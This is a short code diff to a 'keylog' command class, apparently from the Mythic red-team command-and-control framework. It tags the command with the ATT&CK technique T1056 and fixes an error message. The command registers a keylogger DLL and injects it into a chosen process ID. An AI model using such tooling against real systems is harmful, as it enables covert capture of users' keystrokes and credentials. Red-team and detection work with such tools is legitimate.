@@ -50,7 +50,7 @@ class KeylogCommand(CommandBase):
     is_remove_file = False
     author = "@djhohnstein"
     argument_class = KeylogArguments
-    attackmapping = []
+    attackmapping = ["T1056"]
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
         task.args.add_arg("pipe_name", str(uuid4()))
@@ -64,7 +64,7 @@ class KeylogCommand(CommandBase):
         if file_resp.status == MythicStatus.Success:
             task.args.add_arg("file_id", file_resp.response['agent_file_id'])
         else:
-            raise Exception("Failed to register keylogger DLL: " + file_resp.error_message)
+            raise Exception("Failed to register keylogger DLL: " + file_resp.error)
         task.display_params = "Injecting keylogger into PID: {} ({})".format(task.args.get_arg("pid"), task.args.get_arg("arch"))
         task.args.remove_arg("arch")
         return task
